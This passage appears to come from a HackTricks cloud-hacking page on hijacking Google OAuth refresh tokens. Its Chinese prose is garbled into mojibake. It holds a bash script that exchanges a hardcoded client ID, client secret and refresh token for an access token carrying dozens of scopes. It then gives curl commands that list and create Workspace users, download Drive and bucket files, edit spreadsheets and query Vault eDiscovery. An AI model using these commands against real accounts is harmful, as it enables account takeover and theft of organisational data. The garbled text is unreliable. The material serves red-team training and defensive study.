https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

è¯·æ³¨æ„ï¼Œæœ€æœ‰è¶£çš„å¯èƒ½æ˜¯ï¼š
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
ç„¶è€Œï¼Œæˆ‘å°è¯•ä½¿ç”¨è¿™ä¸ªèŒƒå›´è®¿é—® gmail æˆ–åˆ—å‡ºç»„ï¼Œä½†æ²¡æœ‰æˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä¸çŸ¥é“å®ƒè¿˜æœ‰å¤šå¤§ç”¨å¤„ã€‚

**è·å–å…·æœ‰æ‰€æœ‰è¿™äº›èŒƒå›´çš„è®¿é—®ä»¤ç‰Œ**ï¼š

<details>

<summary>ç”¨äºä» refresh_token ç”Ÿæˆå…·æœ‰æ‰€æœ‰èŒƒå›´çš„è®¿é—®ä»¤ç‰Œçš„ Bash è„šæœ¬</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

ä¸€äº›ä½¿ç”¨è¿™äº›èŒƒå›´çš„ç¤ºä¾‹ï¼š

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** æ˜¯ Google Workspace çš„ä¸€ä¸ªé™„åŠ ç»„ä»¶ï¼Œæä¾›æ•°æ®ä¿ç•™ã€æœç´¢å’Œå¯¼å‡ºå·¥å…·ï¼Œç”¨äºç®¡ç†å­˜å‚¨åœ¨ Google Workspace æœåŠ¡ï¼ˆå¦‚ Gmailã€Driveã€Chat ç­‰ï¼‰ä¸­çš„ç»„ç»‡æ•°æ®ã€‚

* åœ¨ Google Workspace Vault ä¸­ï¼Œ**Matter** æ˜¯ä¸€ä¸ª **å®¹å™¨**ï¼Œç”¨äºç»„ç»‡å’Œæ±‡æ€»ä¸ç‰¹å®šæ¡ˆä»¶ã€è°ƒæŸ¥æˆ–æ³•å¾‹äº‹åŠ¡ç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ã€‚å®ƒä½œä¸ºç®¡ç†ä¸è¯¥ç‰¹å®šé—®é¢˜ç›¸å…³çš„ **Holds**ã€**Searches** å’Œ **Exports** çš„ä¸­å¿ƒæ¢çº½ã€‚
* åœ¨ Google Workspace Vault ä¸­ï¼Œ**Hold** æ˜¯å¯¹ç‰¹å®šç”¨æˆ·æˆ–ç»„æ–½åŠ çš„ **ä¿ç•™æªæ–½**ï¼Œä»¥ **é˜²æ­¢åˆ é™¤æˆ–æ›´æ”¹** ä»–ä»¬åœ¨ Google Workspace æœåŠ¡ä¸­çš„æ•°æ®ã€‚Holds ç¡®ä¿ç›¸å…³ä¿¡æ¯åœ¨æ³•å¾‹æ¡ˆä»¶æˆ–è°ƒæŸ¥æœŸé—´ä¿æŒå®Œæ•´ä¸”æœªè¢«ä¿®æ”¹ã€‚
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
æ›´å¤š [æ–‡æ¡£ä¸­çš„ API ç«¯ç‚¹](https://developers.google.com/vault/reference/rest)ã€‚

</details>

## å‚è€ƒæ–‡çŒ®

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
